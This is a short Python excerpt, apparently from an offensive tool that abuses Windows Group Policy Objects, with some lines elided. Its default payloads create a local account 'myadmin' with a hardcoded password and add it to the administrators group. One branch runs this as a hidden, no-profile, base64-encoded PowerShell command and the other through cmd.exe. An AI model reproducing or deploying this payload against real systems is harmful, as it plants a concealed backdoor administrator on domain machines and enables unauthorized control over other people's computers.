    ...
    def __init__(self, gpo_type="computer", name="", mod_date="", description="", powershell=False, command="", old_value=""):
        ...
        if powershell:
            ...
            if command:
                ...
                self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode('net user myadmin 123qweasdF! /add; net localgroup administrators myadmin /add'.encode('UTF-16LE')).decode('utf-8')))
        else:
            self._shell = escape('c:\\windows\\system32\\cmd.exe')
            if command:
                self._command = escape('/c "{}"'.format(command))
            else:
                self._command = escape('/c "net user myadmin 123qweasdF! /add && net localgroup administrators myadmin /add"')
